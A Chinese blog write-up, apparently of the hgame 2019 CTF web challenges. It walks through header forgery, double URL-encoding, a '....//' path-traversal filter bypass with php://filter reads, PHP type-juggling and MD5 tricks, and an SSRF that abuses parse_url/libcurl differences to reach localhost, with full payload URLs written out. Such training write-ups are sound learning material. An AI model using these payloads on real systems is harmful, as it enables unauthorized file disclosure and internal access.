---
title: hgame-writeup-web
date: 2019-02-09 12:21:28
tags:
  - CTF
  - 信息安全
  - web安全
  - write-up
categories: 信息安全
---

又是俩月没有接触信安，看到这次hgame的ctf，也参与下学习下。

<!-- more -->
WEB

# Level - Week1

## 谁吃了我的flag

> 描述：呜呜呜，Mki一起床发现写好的题目变成这样了，是因为昨天没有好好关机吗T_T
>
> URL：http://118.25.111.31:10086/index.html

打开页面内容为

```
damn...hgame2019 is coming soon, but the stupid Mki haven't finished his web-challenge...


fine, nothing serious, just give you flag this time...


the flag is hgame{3eek_diScl0Sure
```

根据描述，猜测应该产生了错误文件，vim的错误文件为 `.swp`，`.swo`，`.swn` 访问url `http://118.25.111.31:10086/.index.html.swp` 下载到文件，**PS：不要忘记.点**

利用 `vim -r index.html.swp` 查看到原内容

```html
<!DOCTYPE HTML>
<html>
        <head>
                <title>谁吃了我的flag???</title>
        </head>
        <body>
                <p>damn...hgame2019 is coming soon, but the stupid Mki haven't finished his web-challenge...</p>
                </br>
                <p>fine, nothing serious, just give you flag this time...</p>
                </br>
                <p>the flag is hgame{3eek_diScl0Sure_fRom+wEbsit@}
        </body>
</html>
```

> flag：hgame{3eek_diScl0Sure_fRom+wEbsit@}



## 换头大作战

> 描述：想要flag嘛
>
> URL：<http://120.78.184.111:8080/week1/how/index.php>

![](https://ww1.sinaimg.cn/large/007i4MEmgy1fzj72435zej30j004qq3b.jpg)

看hint是要转换成post提交。

![](https://ww1.sinaimg.cn/large/007i4MEmgy1fzj74cipvrj30pd0ixtas.jpg)

要求xff，那就在header里加xff

![](https://ww1.sinaimg.cn/large/007i4MEmgy1fzj76alb0rj30om0jxjtk.jpg)

提示又要User-Agent，copy一份火狐的ua，然后替换下

![1548426465416.png](https://i.loli.net/2019/02/09/5c5e56a4334b5.png)

继续提示要Referer，那就在header再添加

![1548426526779.png](https://i.loli.net/2019/02/09/5c5e56eca4fe0.png)

提示Cookie，又指明not admin，查看cookie信息

![](https://ww1.sinaimg.cn/large/007i4MEmgy1fzj79nh22aj314702bweh.jpg)

修改下value为1

![](https://ww1.sinaimg.cn/large/007i4MEmgy1fzj7aw4cucj30ii097ab1.jpg)

> flag：hgame{hTTp_HeaDeR_iS_Ez}



## very easy web

> 描述：代码审计初♂体验
>
> URL：<http://120.78.184.111:8080/week1/very_ez/index.php>

```php
<?php
error_reporting(0);
include("flag.php");

if(strpos("vidar",$_GET['id'])!==FALSE)
  die("<p>干巴爹</p>");

$_GET['id'] = urldecode($_GET['id']);
if($_GET['id'] === "vidar")
{
  echo $flag;
}
highlight_file(__FILE__);
?>
```

php拿到url后会自动解码一次，那只要把vidar两次urlencode就好了，自然而然第一个if也不会进去了。

```
第一次urlencode
%76%69%64%61%72

第二次
%25%37%36%25%36%39%25%36%34%25%36%31%25%37%32

payload：
http://120.78.184.111:8080/week1/very_ez/index.php?id=%25%37%36%25%36%39%25%36%34%25%36%31%25%37%32
```



> flag：hgame{urlDecode_Is_GoOd}



## can u find me?

> 描述：为什么不问问神奇的十二姑娘和她的小伙伴呢
>
> URL：<http://47.107.252.171:8080/>

```html
<!DOCTYPE html>
<html>
<head>
	<title>can u find me?</title>
</head>
<body>
	<p>the gate has been hidden</p>
	<p>can you find it? xixixi</p>
	<a href="f12.php"></a>
</body>
</html>
```

查看源码看到f12.php 由于a标签内没写内容，所以是看不到的。

![](https://ww1.sinaimg.cn/large/007i4MEmgy1fzj7t7z6ivj313f0gqtas.jpg)

然后得到这个内容，接下来应该把header中的password的内容woyaoflag给post过去，

![](https://ww1.sinaimg.cn/large/007i4MEmgy1fzj7ut652oj30is0eedgw.jpg)

![](https://ww1.sinaimg.cn/large/007i4MEmgy1fzj7wcgc0xj30lo0bywf9.jpg)

返回了这个内容，后来看了下fiddler，原来中间还有个302重定向

![](https://ww1.sinaimg.cn/large/007i4MEmgy1fzj7xcef8bj310h0bs0vw.jpg)

看到URL变化了，这个应该要注意到的。

> flag：hgame{f12_1s_aMazIng111}



# Level - Week 2

## easy_php

>描述：代码审计♂第二弹
>
>URL：<http://118.24.25.25:9999/easyphp/index.html>

打开URL显示

> come on ! second wait you

右键查看源代码

```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <title>where is my robots</title>
    </head>
    <body>
        come on ! second wait you 
    </body>
    </html>
```

访问 `http://118.24.25.25:9999/easyphp/robots.txt` 内容为 `img/index.php`，接着访问 `http://118.24.25.25:9999/easyphp/img/index.php`，看到内容

![image.png](https://upload-images.jianshu.io/upload_images/14657587-686540cd04dcccfe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

```php
<?php
error_reporting(0);
$img = $_GET['img'];
if(!isset($img))
$img = '1';
$img = str_replace('../', '', $img);
include_once($img.".php");
highlight_file(__FILE__);
```



包含文件内容，看到了`str_replace`过滤 `../`防止读取上层文件内容，但是这只是过滤了一次，所以想到

1. flag应该就在上层中
2. 可以用 `....//`这样来绕过，之过滤一次后剩下还有一个 `../`

于是先简单试试第一个payload

`http://118.24.25.25:9999/easyphp/img/index.php?img=....//flag` 

显示 *"maybe_you_should_think_think"* 那应该文件和绕过是没错了，内容被include进去了，使用伪协议读

`http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=....//flag`

读到 

> PD9waHAKICAgIC8vJGZsYWcgPSAnaGdhbWV7WW91XzRyZV9Tb19nMG9kfSc7CiAgICBlY2hvICJtYXliZV95b3Vfc2hvdWxkX3RoaW5rX3RoaW5rIjsK

base64decode后

```php
<?php
//$flag = 'hgame{You_4re_So_g0od}';
echo "maybe_you_should_think_think";
    
```

> flag：hgame{You_4re_So_g0od}



## php trick

>描述：some php tricks
>
>URL：[http://118.24.3.214:3001](http://118.24.3.214:3001/)

```php
<?php
//admin.php
highlight_file(__FILE__);
$str1 = (string)@$_GET['str1'];
$str2 = (string)@$_GET['str2'];
$str3 = @$_GET['str3'];
$str4 = @$_GET['str4'];
$str5 = @$_GET['H_game'];
$url = @$_GET['url'];
if( $str1 == $str2 ){
    die('step 1 fail');
}
if( md5($str1) != md5($str2) ){
    die('step 2 fail');
}
if( $str3 == $str4 ){
    die('step 3 fail');
}
if ( md5($str3) !== md5($str4)){
    die('step 4 fail');
}
if (strpos($_SERVER['QUERY_STRING'], "H_game") !==false) {
    die('step 5 fail');
}
if(is_numeric($str5)){
    die('step 6 fail');
}
if ($str5<9999999999){
    die('step 7 fail');
}
if ((string)$str5>0){
    die('step 8 fial');
}
if (parse_url($url, PHP_URL_HOST) !== "www.baidu.com"){
    die('step 9 fail');
}
if (parse_url($url,PHP_URL_SCHEME) !== "http"){
    die('step 10 fail');
}
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
$output = curl_exec($ch);
curl_close($ch);
if($output === FALSE){
    die('step 11 fail');
}
else{
    echo $output;
}
```

看到后前四个step大概知道怎么解决

1. step1和2使用弱类型的trick来绕过
2. step3和4使用array的md5为null来绕过

> str1=240610708&str2=QNKCDZO&str3[]=1&str4[]=2

step5猜想并测试后证实，QUERY_STRING不会自动urldecode，而`$_GET`会自动urldecode的，所以使用`%48_game`随意urlencode一个字符绕过。

> %48_game

step6、7、8把我卡得有点久，第一以为是用科学计数法来绕，然后发现7、8是矛盾的，无法过，，，（可能是我太弱鸡了）

后来发现了一个trick，**array和数字比较永远array大**，那这个问题就好解决了，构造如下payload

> %48_game[]=admin

然后step9、10、11是有关parse_url的，需要符合SCHEME是http，HOST是www.baidu.com，然后用curl去访问这个URI后将内容给echo出来。猜测到应该是要读取某个URI吧，得利用parse_url的bug去解析host

发现`//admin.php`这个hint还没利用，先访问得到提示`only localhost can see it`，那就应该是要读取这个文件了

查询了有关parse_url的trick，然后我发现都是path有关的，这里显然是要解析host，最后在文章中找到相关方法

> Reference：
>
> <https://fireshellsecurity.team/sunshinectf-search-box/>
>
> http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html

- 当url中有多个@符号时，**parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的**。因此当代码对`http://user@eval.com:80@baidu.com` 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过
- 此外对于`https://evil@baidu.com`这样的域名进行解析时,php获取的host是[`evil@baidu.com](mailto:%60evil@baidu.com)`，但是libcurl获取的host却是evil.com

利用这个trick，测试用payload

> url=http://user@127.0.0.1:80@www.baidu.com/admin.php

得到

```php
<?php
//flag.php
if($_SERVER['REMOTE_ADDR'] != '127.0.0.1') {
    die('only localhost can see it');
}
$filename = $_GET['filename']??'';

if (file_exists($filename)) {
    echo "sorry,you can't see it";
}
else{
    echo file_get_contents($filename);
}
highlight_file(__FILE__);
?>
```

nice，然后再用伪协议读取一下，payload为

> url=http://user@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php

完成的URL payload为

```url
http://118.24.3.214:3001/?str1=240610708&str2=QNKCDZO&str3[]=1&str4[]=2&%48_game[]=admin&url=http://user@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php
```

得到base64encode内容

> PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA/Pgo=

解码后

```php
<?php $flag = hgame{ThEr4_Ar4_s0m4_Php_Tr1cks} ?>
```





后面的题未来得及解，弱鸡瑟瑟发抖，新年表哥们都不休息嘛？